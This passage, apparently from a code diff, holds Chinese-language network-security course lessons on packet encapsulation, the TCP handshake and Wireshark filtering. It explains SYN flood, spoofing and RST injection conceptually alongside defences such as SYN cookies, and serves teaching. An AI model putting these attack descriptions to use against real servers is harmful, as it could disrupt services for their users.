class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  00 1a 2b 12 34 56  &gt; 目标 MAC 地址 (Cisco_12:34:56)\r\n  d4 be d9 a1 b2 c3  &gt; 源 MAC 地址 (Dell_a1:b2:c3)\r\n  08 00              &gt; 类型: IPv4\r\n</code></pre></div>\r\n\r\n<h3>IP 头部（紧接着的 20 字节）</h3>\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  45     &gt; Version=4, IHL=5 (5x4=20 bytes)\r\n  00     &gt; DSCP/ECN\r\n  01 42  &gt; Total Length = 322 bytes\r\n  3c f1  &gt; Identification = 0x3CF1\r\n  40 00  &gt; Flags=Don't Fragment, Offset=0\r\n  40     &gt; TTL = 64 (Linux 系统!)\r\n  06     &gt; Protocol = 6 (TCP)\r\n  b2 c3  &gt; Header Checksum\r\n  c0 a8 01 64  &gt; Source IP: 192.168.1.100\r\n  cb 00 71 32  &gt; Destination IP: 203.0.113.50\r\n</code></pre></div>\r\n\r\n<h3>TCP 头部（再 20 字节）</h3>\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  d4 31  &gt; Source Port: 54321\r\n  00 50  &gt; Destination Port: 80\r\n  a1 b2 c3 d4  &gt; Sequence Number\r\n  e5 f6 a7 b8  &gt; Acknowledgment Number\r\n  50 18        &gt; Data Offset=5, Flags=[PSH, ACK]\r\n  fa f0        &gt; Window Size: 64240\r\n  c5 a5        &gt; Checksum\r\n  00 00        &gt; Urgent Pointer\r\n</code></pre></div>\r\n\r\n<h3>应用层数据</h3>\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  从偏移 0x36 开始就是 HTTP 请求:\r\n  \"GET / HTTP/1.1\\r\\nHost: cyberedu.cn\\r\\nUser-Agent: Mozilla/5.0...\"\r\n</code></pre></div>\r\n\r\n<p>看到了吗？在 Wireshark 中，你看到的不只是一堆十六进制数字——它是一个<strong>有结构的、可以逐字节解读的信息包</strong>。每一层都有自己的字段，每个字段都有明确的含义。</p>\r\n\r\n<h2>动手实验：自己抓一个包</h2>\r\n\r\n<p>现在轮到你了。打开 Wireshark，按照以下步骤操作：</p>\r\n\r\n<ol>\r\n  <li>选择你的网络接口（通常是 <code>Wi-Fi</code> 或 <code>Ethernet</code>），点击开始捕获</li>\r\n  <li>在浏览器中访问一个 HTTP（不是 HTTPS）网站，比如 <code>http://example.com</code></li>\r\n  <li>在 Wireshark 的过滤器栏输入 <code>http</code>，找到你的 GET 请求</li>\r\n  <li>右键点击该包 &gt; \"Follow\" &gt; \"HTTP Stream\"，看看完整的请求和响应</li>\r\n</ol>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 或者用命令行工具 tshark (Wireshark 的 CLI 版本):\r\ntshark -i eth0 -f \"tcp port 80\" -V -c 10\r\n\r\n# -i eth0     : 监听 eth0 接口\r\n# -f          : 捕获过滤器 (只抓 80 端口)\r\n# -V          : 显示完整的协议解析\r\n# -c 10       : 只抓 10 个包\r\n</code></pre></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">实践技巧</div><p>在 Wireshark 中，你可以用 <code>Frame Details</code> 面板逐层展开每个协议层。每一层都可以展开看到具体的字段和值。这是理解封装最直观的方式——你能同时看到 Ethernet、IP、TCP 和 HTTP 四层的结构。</p></div>\r\n\r\n<h2>封装大小与 MTU</h2>\r\n\r\n<p>你可能会问：一个数据包最大能有多大？答案是 <strong>MTU（Maximum Transmission Unit）</strong>——Ethernet 的默认 MTU 是 <strong>1500 字节</strong>。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Ethernet MTU = 1500 bytes\r\n  ┌──────────────────────────────────────────┐\r\n  │ IP Header:     20 bytes                   │\r\n  │ TCP Header:    20 bytes                   │\r\n  │ ─────────────────────────────             │\r\n  │ 可用数据空间: 1500 - 20 - 20 = 1460 bytes │ &lt; MSS\r\n  └──────────────────────────────────────────┘\r\n\r\n  如果 HTTP 响应是 100KB：\r\n  需要 100,000 / 1460 = 69 个 TCP 段\r\n</code></pre></div>\r\n\r\n<p>如果数据超过 MTU，IP 层会进行<strong>分片（Fragmentation）</strong>——把一个大包拆成多个小包。分片机制是一个重要的安全话题，因为：</p>\r\n<ul>\r\n  <li>恶意分片可以绕过 IDS 的检测</li>\r\n  <li>重叠分片（Overlapping Fragments）可以导致目标系统崩溃（如经典的 Teardrop 攻击）</li>\r\n  <li>Path MTU Discovery 可以被劫持来降低连接的 MTU</li>\r\n</ul>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>在 Linux 上查看 MTU：<code>ip link show</code>；在 Windows 上：<code>netsh interface ipv4 show subinterfaces</code>。如果 MTU 不匹配，会导致\"能 ping 通但网页打不开\"的经典问题。</p></div>\r\n\r\n<h2>攻击者视角：每一层都是战场</h2>\r\n\r\n<p>作为安全工程师，你需要知道攻击者在每一层能做什么：</p>\r\n\r\n<table>\r\n  <thead>\r\n    <tr><th>协议层</th><th>攻击手法</th><th>防御手段</th></tr>\r\n  </thead>\r\n  <tbody>\r\n    <tr><td>应用层</td><td>SQL 注入、XSS、HTTP 头注入</td><td>输入验证、WAF、HTTPS</td></tr>\r\n    <tr><td>传输层</td><td>SYN Flood、端口扫描</td><td>SYN Cookie、防火墙规则</td></tr>\r\n    <tr><td>网际层</td><td>IP 欺骗、分片攻击、ICMP 隧道</td><td>入口过滤、重组检查</td></tr>\r\n    <tr><td>网络接口层</td><td>ARP 欺骗、MAC Flood</td><td>端口安全、802.1X</td></tr>\r\n  </tbody>\r\n</table>\r\n\r\n<p>在接下来的几节中，我们将深入每一层，学习具体的协议细节和攻击技术。下一节，我们先从 TCP 的三次握手开始——理解连接是如何建立的，以及为什么它可以被攻击。</p>\r\n\r\n<div class=\"checkpoint\" data-cp=\"0\"></div>\r\n<div class=\"checkpoint\" data-cp=\"1\"></div>\r\n<div class=\"checkpoint\" data-cp=\"2\"></div>\r\n\r\n</section>";
+
+SECTION_CONTENT["net-01-02"] = "<section id=\"net-01-02\" data-content-key=\"net-01-02\" data-chapter=\"net-01\">\r\n\r\n<div class=\"section-transition\"><p>上一节我们看到了数据包如何被层层封装——但在数据能够传输之前，TCP 需要先建立一条\"连接通道\"。这个过程就是著名的三次握手。让我们用 Wireshark 把它拆开来看。</p></div>\r\n\r\n<h1>TCP 三次握手详解：连接是这样建立的</h1>\r\n\r\n<p>在你能发送 HTTP 请求之前，TCP 协议需要先和目标服务器\"打个招呼\"，确认双方都准备好了。这个过程叫做<strong>三次握手（Three-Way Handshake）</strong>，是 TCP 可靠传输的基石。</p>\r\n\r\n<p>为什么需要三次？两次不行吗？四次是不是多余？这些问题的答案不仅涉及网络理论，更直接关系到 <strong>SYN Flood 攻击</strong>的原理——作为安全人员，你必须彻底理解这个过程。</p>\r\n\r\n<h2>握手全景：SYN - SYN/ACK - ACK</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  客户端 (你)                              服务器 (cyberedu.cn)\r\n  ─────────                                ────────────────────\r\n\r\n  [SYN]                                   \r\n  Seq=1000                                ────────────────&gt;\r\n                                          \r\n                                           [SYN, ACK]     \r\n                      &lt;────────────────     Seq=5000, Ack=1001\r\n                                          \r\n  [ACK]                                   \r\n  Seq=1001, Ack=5001  ────────────────&gt;\r\n                                          \r\n  ════════════════════════════════════════\r\n  连接建立！可以开始传输数据了\r\n  ════════════════════════════════════════\r\n\r\n  [PSH, ACK]\r\n  \"GET / HTTP/1.1...\"  ────────────────&gt;\r\n  Seq=1001\r\n</code></pre></div>\r\n\r\n<h2>第一步：客户端发送 SYN</h2>\r\n\r\n<p>你的浏览器想要连接 cyberedu.cn 的 80 端口。它会发送一个特殊的 TCP 包——<strong>SYN 包</strong>（SYNchronize 的缩写）。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Wireshark 中看到的 SYN 包:\r\n\r\n  No.  Time       Source          Destination    Protocol  Info\r\n  1    0.000000   192.168.1.100   203.0.113.50   TCP       54321 &gt; 80 [SYN] Seq=0\r\n\r\n  展开 TCP 头部:\r\n  ┌───────────────────────────────────────────┐\r\n  │ Source Port:      54321                    │\r\n  │ Destination Port: 80                       │\r\n  │ Sequence Number:  1000 (relative: 0)       │\r\n  │ Ack Number:       0                        │\r\n  │ Flags:            0x002 [SYN]              │\r\n  │   0... .... = Congestion Window Reduced: 0 │\r\n  │   .0.. .... = ECN-Echo: 0                 │\r\n  │   ..0. .... = Urgent: 0                   │\r\n  │   ...0 .... = Acknowledgment: 0           │\r\n  │   .... 0... = Push: 0                     │\r\n  │   .... .0.. = Reset: 0                    │\r\n  │   .... ..1. = Syn: 1        &lt;-- 关键!     │\r\n  │   .... ...0 = Fin: 0                      │\r\n  │ Window Size:      64240                    │\r\n  │ Options:                                   │\r\n  │   MSS: 1460                                │\r\n  │   SACK Permitted: True                     │\r\n  │   Window Scale: 7                          │\r\n  │   Timestamps: enabled                      │\r\n  └───────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>关键细节：</p>\r\n<ul>\r\n  <li><strong>SYN flag = 1</strong>：这是握手的第一步，告诉服务器\"我想建立连接\"</li>\r\n  <li><strong>Seq = 1000</strong>：客户端随机选择的初始序列号（ISN, Initial Sequence Number）。Wireshark 默认显示相对值 0</li>\r\n  <li><strong>Window Size = 64240</strong>：客户端告诉服务器\"我最多能接收 64240 字节的数据\"</li>\r\n  <li><strong>MSS = 1460</strong>：Maximum Segment Size，每个 TCP 段最大能装多少数据</li>\r\n</ul>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>ISN 不是真正的随机数！操作系统使用一个基于时间和连接的伪随机算法来生成 ISN。如果 ISN 可预测，攻击者可以伪造 TCP 连接——这就是 <strong>TCP 序列号预测攻击</strong>，在 DNS 缓存投毒中会用到。</p></div>\r\n\r\n<h2>第二步：服务器回复 SYN/ACK</h2>\r\n\r\n<p>服务器收到 SYN 后，如果愿意接受连接，就会回复一个同时带有 <strong>SYN 和 ACK</strong> 标志的包。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Wireshark 中看到的 SYN/ACK 包:\r\n\r\n  No.  Time       Source          Destination    Protocol  Info\r\n  2    0.023456   203.0.113.50    192.168.1.100  TCP       80 &gt; 54321 [SYN, ACK] Seq=0 Ack=1\r\n\r\n  展开 TCP 头部:\r\n  ┌───────────────────────────────────────────┐\r\n  │ Source Port:      80                       │\r\n  │ Destination Port: 54321                    │\r\n  │ Sequence Number:  5000 (relative: 0)       │\r\n  │ Ack Number:       1001 (relative: 1)       │\r\n  │ Flags:            0x012 [SYN, ACK]         │\r\n  │   .... ...0 = Urgent: 0                   │\r\n  │   .... ..1. = Acknowledgment: 1  &lt;-- 确认 │\r\n  │   .... .0.. = Reset: 0                    │\r\n  │   .... ..1. = Syn: 1       &lt;-- 同步       │\r\n  │   .... ...0 = Fin: 0                      │\r\n  │ Window Size:      65535                    │\r\n  │ Options:                                   │\r\n  │   MSS: 1460                                │\r\n  │   SACK Permitted: True                     │\r\n  │   Window Scale: 7                          │\r\n  └───────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>这个包做了两件事：</p>\r\n<ol>\r\n  <li><strong>ACK = 1001</strong>：确认收到了客户端的 SYN。Ack 值 = 客户端 Seq + 1，意思是\"我收到了你序号为 1000 的 SYN，期待你的下一个包从 1001 开始\"</li>\r\n  <li><strong>SYN + Seq = 5000</strong>：服务器自己也需要建立到客户端的连接，所以也发一个 SYN，带着自己的 ISN</li>\r\n</ol>\r\n\r\n<p>此时服务器会进入 <code>SYN_RECEIVED</code> 状态，并在内存中分配一个<strong>半连接（Half-Open Connection）</strong>的数据结构，等待客户端的最终确认。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">攻击预警</div><p>这个\"半连接\"就是 <strong>SYN Flood 攻击</strong>的关键弱点。如果攻击者发送大量 SYN 包但不回复 ACK，服务器的半连接队列就会被填满，无法接受正常连接。我们稍后会详细讨论。</p></div>\r\n\r\n<h2>第三步：客户端发送 ACK</h2>\r\n\r\n<p>客户端收到 SYN/ACK 后，发送最后一个 ACK 包完成握手：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  Wireshark 中看到的 ACK 包:\r\n\r\n  No.  Time       Source          Destination    Protocol  Info\r\n  3    0.023789   192.168.1.100   203.0.113.50   TCP       54321 &gt; 80 [ACK] Seq=1 Ack=1\r\n\r\n  展开 TCP 头部:\r\n  ┌───────────────────────────────────────────┐\r\n  │ Source Port:      54321                    │\r\n  │ Destination Port: 80                       │\r\n  │ Sequence Number:  1001 (relative: 1)       │\r\n  │ Ack Number:       5001 (relative: 1)       │\r\n  │ Flags:            0x010 [ACK]              │\r\n  │ Window Size:      64240                    │\r\n  └───────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<p>至此，三次握手完成！双方的连接状态从：</p>\r\n<ul>\r\n  <li>客户端：CLOSED &gt; SYN_SENT &gt; <strong>ESTABLISHED</strong></li>\r\n  <li>服务器：LISTEN &gt; SYN_RECEIVED &gt; <strong>ESTABLISHED</strong></li>\r\n</ul>\r\n\r\n<p>接下来就可以发送 HTTP 数据了——通常这个 ACK 包会直接携带 HTTP 请求数据（PSH + ACK），以减少一次网络往返。</p>\r\n\r\n<h2>为什么是三次，不是两次？</h2>\r\n\r\n<p>这个问题在面试中经常出现。核心原因是：<strong>防止历史重复连接的初始化</strong>。</p>\r\n\r\n<p>假设只有两次握手：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  场景：一个延迟的旧 SYN 到达了服务器\r\n\r\n  客户端                        服务器\r\n  ─────────                     ─────────\r\n\r\n  (很久以前的旧 SYN)\r\n  Seq=300                       ─────────────&gt;\r\n                                服务器以为是新连接!\r\n                                分配资源，进入 SYN_RCVD\r\n                   &lt;─────────── [SYN, ACK]\r\n                                服务器认为连接已建立\r\n                                (因为只有两次握手)\r\n  客户端：我没发过 SYN 啊？     白白浪费了资源!\r\n  发送 [RST] 拒绝连接\r\n</code></pre></div>\r\n\r\n<p>有了三次握手，客户端可以识别这个不请自来的 SYN/ACK 并发送 RST 拒绝，服务器就不会浪费资源。</p>\r\n\r\n<h2>用 Wireshark 过滤三次握手</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 只看 TCP 握手相关的包:\r\ntcp.flags.syn == 1 or tcp.flags.ack == 1\r\n\r\n# 只看特定端口的握手:\r\ntcp.port == 80 and (tcp.flags.syn == 1)\r\n\r\n# 找出所有 SYN 包（不包括 SYN/ACK）—— 端口扫描检测:\r\ntcp.flags.syn == 1 and tcp.flags.ack == 0\r\n\r\n# 找出所有 RST 包 —— 连接被拒绝的信号:\r\ntcp.flags.reset == 1\r\n</code></pre></div>\r\n\r\n<p>动手试试！在 Wireshark 中应用上面的过滤器，你会清晰地看到每个 TCP 连接的三步握手过程。</p>\r\n\r\n<h2>SYN Flood 攻击：三次握手的致命弱点</h2>\r\n\r\n<p>现在你已经理解了三次握手的每一步，让我们看看攻击者如何利用这个过程：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  正常的三次握手:\r\n  客户端                     服务器\r\n  [SYN]         ─────────&gt;   创建半连接\r\n  [SYN,ACK]     &lt;─────────\r\n  [ACK]         ─────────&gt;   完成连接\r\n\r\n  SYN Flood 攻击:\r\n  攻击者                     服务器\r\n  [SYN] (假IP)  ─────────&gt;   创建半连接 #1\r\n  [SYN,ACK]     ─────────&gt;   发到假的 IP，永远不会有回复\r\n  [SYN] (假IP)  ─────────&gt;   创建半连接 #2\r\n  [SYN,ACK]     ─────────&gt;   发到假的 IP\r\n  [SYN] (假IP)  ─────────&gt;   创建半连接 #3\r\n  ...            ...          ...\r\n  [SYN] (假IP)  ─────────&gt;   半连接队列满了!\r\n                              新的合法 SYN 被丢弃!\r\n</code></pre></div>\r\n\r\n<p>攻击者利用的关键点：</p>\r\n<ol>\r\n  <li><strong>伪造源 IP</strong>：SYN 包中的源 IP 是假的，服务器的 SYN/ACK 永远收不到回复</li>\r\n  <li><strong>半连接资源消耗</strong>：每个半连接占用服务器内存和时间（默认 75 秒超时）</li>\r\n  <li><strong>队列溢出</strong>：当半连接队列满时，合法用户的连接请求被拒绝</li>\r\n</ol>\r\n\r\n<h3>防御方案：SYN Cookie</h3>\r\n\r\n<p>SYN Cookie 的核心思想是：<strong>不立即分配资源</strong>。服务器在收到 SYN 时，不创建半连接数据结构，而是把连接信息编码到 ISN 中：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  SYN Cookie ISN 结构 (32 bit):\r\n\r\n  ┌─────────┬──────────┬─────────────────────────┐\r\n  │ 5 bits  │ 3 bits   │ 24 bits                 │\r\n  │ t mod 32│ MSS 编码  │ Hash(IP_src, Port_src,  │\r\n  │ (时间戳) │          │ IP_dst, Port_dst, t)    │\r\n  └─────────┴──────────┴─────────────────────────┘\r\n\r\n  当收到 ACK 时，服务器：\r\n  1. 从 Ack 值中提取 ISN\r\n  2. 重新计算 Hash 验证合法性\r\n  3. 验证通过后才正式建立连接\r\n</code></pre></div>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 在 Linux 上启用 SYN Cookie:\r\necho 1 &gt; /proc/sys/net/ipv4/tcp_syncookies\r\n\r\n# 或者永久设置（在 /etc/sysctl.conf 中）:\r\nnet.ipv4.tcp_syncookies = 1\r\n\r\n# 调整半连接队列大小:\r\nnet.ipv4.tcp_max_syn_backlog = 2048\r\n\r\n# 减少 SYN-ACK 超时时间:\r\nnet.ipv4.tcp_synack_retries = 2\r\n</code></pre></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">防御者笔记</div><p>SYN Cookie 是防 SYN Flood 的基本手段，但不是万能的。对于大规模 DDoS，你还需要：上游流量清洗（如 Cloudflare）、限速规则（iptables + hashlimit）、以及 SYN Proxy（防火墙代理握手）。</p></div>\r\n\r\n<h2>TCP 四次挥手：连接的优雅告别</h2>\r\n\r\n<p>既然我们讨论了握手（建立连接），也来看看挥手（关闭连接）。TCP 连接的关闭需要四次：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  客户端                              服务器\r\n  ─────────                           ─────────\r\n\r\n  [FIN, ACK]\r\n  Seq=1001                ────────&gt;   收到 FIN，进入 CLOSE_WAIT\r\n  [ACK]                               \r\n                        &lt;────────     确认收到 FIN\r\n                                      \r\n                                      (服务器继续发送剩余数据)\r\n                                      ...\r\n                                      \r\n  [ACK]                   &lt;────────   [FIN, ACK]\r\n  确认收到 FIN                          服务器数据发送完毕\r\n  [ACK]                               \r\n                          ────────&gt;   确认收到 ACK\r\n                                      \r\n  客户端进入 TIME_WAIT (等待 2*MSL)    服务器关闭\r\n  (默认 60 秒后彻底关闭)\r\n</code></pre></div>\r\n\r\n<p>注意 <strong>TIME_WAIT 状态</strong>：主动关闭连接的一方会进入这个状态，持续 2*MSL（Maximum Segment Lifetime，通常 60 秒）。这是为了确保迟到的数据包不会干扰新连接。</p>\r\n\r\n<div class=\"callout warn\"><div class=\"callout-title\">安全视角</div><p>TIME_WAIT 状态可以被利用来实施 DoS 攻击——大量短连接会让服务器的 TIME_WAIT 连接数暴增，耗尽端口资源。在 Windows 上可以用 <code>netstat -an | findstr TIME_WAIT</code> 查看，Linux 上用 <code>ss -s</code>。</p></div>\r\n\r\n<h2>RST 包：粗暴的分手</h2>\r\n\r\n<p>除了四次挥手的\"优雅分手\"，TCP 还有一种\"暴力断连\"：<strong>RST（Reset）包</strong>。</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 在 Wireshark 中查看所有 RST 包:\r\ntcp.flags.reset == 1\r\n\r\n# 常见触发 RST 的场景:\r\n# 1. 向一个没有监听的端口发送 SYN\r\n# 2. 向已关闭的连接发送数据\r\n# 3. 半打开连接超时\r\n# 4. 应用层崩溃\r\n</code></pre></div>\r\n\r\n<p>RST 包在安全领域非常重要：</p>\r\n<ul>\r\n  <li><strong>端口扫描</strong>：如果目标端口关闭，服务器会回复 RST。Nmap 的 SYN 扫描就是利用这个原理</li>\r\n  <li><strong>RST 注入攻击</strong>：攻击者可以伪造 RST 包来中断正在进行的连接（如 GFW 的 TCP 阻断）</li>\r\n  <li><strong>防火墙</strong>：许多防火墙用 RST 包来主动阻断被禁止的连接</li>\r\n</ul>\r\n\r\n<h2>动手实验：抓一次完整的握手</h2>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 1. 打开 Wireshark，开始捕获\r\n# 2. 在浏览器中访问 http://example.com\r\n# 3. 使用以下过滤器查看握手:\r\ntcp.flags.syn == 1 and tcp.port == 80\r\n\r\n# 或者用 tcpdump 命令行:\r\ntcpdump -i eth0 -nn 'tcp[tcpflags] &amp; (tcp-syn|tcp-ack) != 0' and port 80\r\n\r\n# 4. 观察三次握手的细节:\r\n#    - 记录每个包的 Seq 和 Ack 值\r\n#    - 注意 SYN、SYN/ACK、ACK 的 flag 变化\r\n#    - 看看握手完成后，第一个数据包（HTTP GET）的 Seq 是多少\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>在 Wireshark 中，你可以右键点击握手中的任何一个包 &gt; \"Follow\" &gt; \"TCP Stream\"，这样可以看到整个 TCP 会话的所有数据。Wireshark 会用不同颜色区分客户端和服务器的数据。</p></div>\r\n\r\n<h2>本章小结</h2>\r\n\r\n<p>TCP 三次握手看似简单，却蕴含了深刻的设计哲学：</p>\r\n<ul>\r\n  <li><strong>SYN</strong>：我想连接你（初始化）</li>\r\n  <li><strong>SYN/ACK</strong>：好的，我也想连接你（双向确认）</li>\r\n  <li><strong>ACK</strong>：确认，连接建立（完成）</li>\r\n</ul>\r\n<p>三次是防止\"历史 SYN\"导致错误连接的<strong>最小值</strong>。而 SYN Flood 攻击正是利用了握手过程中的<strong>状态不对称</strong>——服务器在第二步就分配了资源，但攻击者永远不会完成第三步。</p>\r\n\r\n<p>下一节，我们将学习如何使用 Wireshark 进行专业的抓包分析——不只是看握手，而是用各种过滤器和技巧来捕获我们需要的网络流量。</p>\r\n\r\n<div class=\"checkpoint\" data-cp=\"3\"></div>\r\n<div class=\"checkpoint\" data-cp=\"4\"></div>\r\n<div class=\"checkpoint\" data-cp=\"5\"></div>\r\n\r\n</section>";
+
+SECTION_CONTENT["net-02"] = "<section id=\"net-02\" data-content-key=\"net-02\" data-chapter=\"net-02\">\r\n\r\n<div class=\"section-transition\"><p>我们已经理解了 TCP 的三次握手——但那只是网络通信的冰山一角。在真实的网络分析和安全排查中，你需要从海量的数据包中快速定位目标流量。这就是 Wireshark 过滤器大显身手的时候了。</p></div>\r\n\r\n<h1>抓包分析与过滤：像侦探一样审视网络流量</h1>\r\n\r\n<p>Wireshark 是网络安全领域最重要的工具之一——没有之一。无论你是做渗透测试、安全运维、还是应急响应，抓包分析都是你的核心技能。在这一节中，我们将从零开始，掌握 Wireshark 的捕获和过滤技术，并学习如何从数据包中提取安全关键信息。</p>\r\n\r\n<h2>捕获前的准备：选择正确的接口</h2>\r\n\r\n<p>打开 Wireshark 后，你会看到一系列网络接口。选择正确的接口至关重要：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  接口列表 (典型 Windows 系统):\r\n  ┌─────────────────────────────┬───────────────┬──────────────┐\r\n  │ 接口名称                     │ 类型          │ 典型 IP       │\r\n  ├─────────────────────────────┼───────────────┼──────────────┤\r\n  │ Ethernet                    │ 有线网卡       │ 192.168.1.x   │\r\n  │ Wi-Fi                       │ 无线网卡       │ 192.168.1.x   │\r\n  │ Loopback (lo)               │ 本地回环       │ 127.0.0.1     │\r\n  │ Npcap Loopback Adapter      │ Npcap 虚拟     │ -             │\r\n  │ VirtualBox Host-Only        │ 虚拟机         │ 192.168.56.x  │\r\n  └─────────────────────────────┴───────────────┴──────────────┘\r\n</code></pre></div>\r\n\r\n<div class=\"callout info\"><div class=\"callout-title\">提示</div><p>在 Linux 上，你需要有 <code>root</code> 权限或者把用户加入 <code>wireshark</code> 组才能抓包：<code>sudo usermod -aG wireshark $USER</code>。在 Windows 上需要安装 Npcap 驱动。</p></div>\r\n\r\n<h2>两种过滤器：捕获 vs 显示</h2>\r\n\r\n<p>Wireshark 有两种完全不同的过滤器，很多初学者会混淆它们：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  ┌─────────────────────────────────────────────────────────────────┐\r\n  │                     Wireshark 过滤器架构                        │\r\n  │                                                                 │\r\n  │  网卡 ──&gt; [捕获过滤器] ──&gt; 内存 ──&gt; [显示过滤器] ──&gt; 屏幕     │\r\n  │           (Capture)                      (Display)              │\r\n  │                                                                 │\r\n  │  捕获过滤器: 在抓包时就过滤，只保存匹配的包                     │\r\n  │              语法: BPF (Berkeley Packet Filter)                 │\r\n  │              设置后不可更改                                      │\r\n  │                                                                 │\r\n  │  显示过滤器: 在显示时过滤，所有包都已保存                        │\r\n  │              语法: Wireshark 专用语法                            │\r\n  │              随时可以切换                                        │\r\n  └─────────────────────────────────────────────────────────────────┘\r\n</code></pre></div>\r\n\r\n<h3>捕获过滤器 (BPF 语法)</h3>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# 只捕获 HTTP 流量 (端口 80)\r\nport 80\r\n\r\n# 只捕获特定主机的流量\r\nhost 203.0.113.50\r\n\r\n# 捕获特定子网的 TCP 流量\r\nsrc net 192.168.1.0/24 and tcp\r\n\r\n# 排除 SSH 流量 (避免抓到自己的操作)\r\nnot port 22\r\n\r\n# 只捕获 SYN 包 (用于检测端口扫描)\r\n'tcp[tcpflags] &amp; (tcp-syn) != 0'\r\n\r\n# 组合: 只抓来自特定 IP 的 80 端口流量\r\nhost 203.0.113.50 and port 80\r\n</code></pre></div>\r\n\r\n<h3>显示过滤器 (Wireshark 语法)</h3>\r\n\r\n<p>显示过滤器更强大，语法也更丰富。以下是最常用的过滤器，建议你<strong>边看边在 Wireshark 中实践</strong>：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-bash\">\r\n# ===== 基础过滤器 =====\r\n\r\n# 按协议过滤\r\nhttp                  # 只看 HTTP 流量\r\ndns                   # 只看 DNS 查询\r\ntls                   # 只看 TLS/SSL 流量\r\nicmp                  # 只看 ICMP (ping)\r\n\r\n# 按 IP 地址过滤\r\nip.src == 192.168.1.100           # 源 IP\r\nip.dst == 203.0.113.50           # 目标 IP\r\nip.addr == 192.168.1.100         # 源或目标\r\n\r\n# 按端口过滤\r\ntcp.port == 80                    # TCP 80 端口\r\nudp.port == 53                    # UDP 53 端口 (DNS)\r\ntcp.srcport == 443                # 源端口为 443\r\n\r\n# ===== 逻辑运算 =====\r\n\r\n# AND (同时满足)\r\nip.src == 192.168.1.100 and tcp.port == 80\r\n\r\n# OR (满足任一)\r\ntcp.port == 80 or tcp.port == 443\r\n\r\n# NOT (排除)\r\nnot arp and not dns               # 排除 ARP 和 DNS\r\n\r\n# ===== TCP 标志位过滤 =====\r\n\r\ntcp.flags.syn == 1 and tcp.flags.ack == 0    # 纯 SYN 包\r\ntcp.flags.reset == 1                          # RST 包\r\ntcp.flags.fin == 1                            # FIN 包\r\n\r\n# ===== 内容过滤 =====\r\n\r\nhttp.request.method == \"GET\"       # 只看 GET 请求\r\nhttp.response.code == 404          # 只看 404 响应\r\nhttp.host contains \"cyberedu\"      # Host 包含特定字符串\r\ndns.qry.name contains \"example\"    # DNS 查询包含特定域名\r\n\r\n# ===== 时间过滤 =====\r\n\r\nframe.time_delta &gt; 1.0            # 包间隔超过 1 秒的 (可能有问题)\r\ntcp.analysis.retransmission        # TCP 重传 (网络质量差)\r\n</code></pre></div>\r\n\r\n<div class=\"callout success\"><div class=\"callout-title\">实践技巧</div><p>Wireshark 的过滤器输入框有<strong>自动补全</strong>功能。输入 <code>tcp.</code> 后等待片刻，会弹出所有 TCP 相关字段的列表。绿色表示语法正确，红色表示语法错误。</p></div>\r\n\r\n<h2>实战场景一：追踪一个完整的 HTTP 会话</h2>\r\n\r\n<p>让我们做一个完整的实验：从 DNS 查询到 HTTP 响应，追踪访问 <code>http://example.com</code> 的全过程。</p>\r\n\r\n<h3>第一步：DNS 查询</h3>\r\n\r\n<p>浏览器需要先知道 example.com 的 IP 地址，所以会先发一个 DNS 查询：</p>\r\n\r\n<div class=\"code-block\"><div class=\"copy-btn\">复制</div><pre><code class=\"language-text\">\r\n  使用过滤器: dns.qry.name == \"example.com\"\r\n\r\n  No.  Time     Source         Dest           Protocol  Info\r\n  1    0.000    192.168.1.100  8.8.8.8        DNS       Standard query A example.com\r\n\r\n  DNS 查询详情:\r\n  ┌───────────────────────────────────────────────┐\r\n  │ Transaction ID: 0xa1b2                        │\r\n  │ Flags: 0x0100 Standard query                  │\r\n  │ Questions: 1                                  │\r\n  │ Queries:                                      │\r\n  │   Name: example.com                           │\r\n  │   Type: A (Host Address)        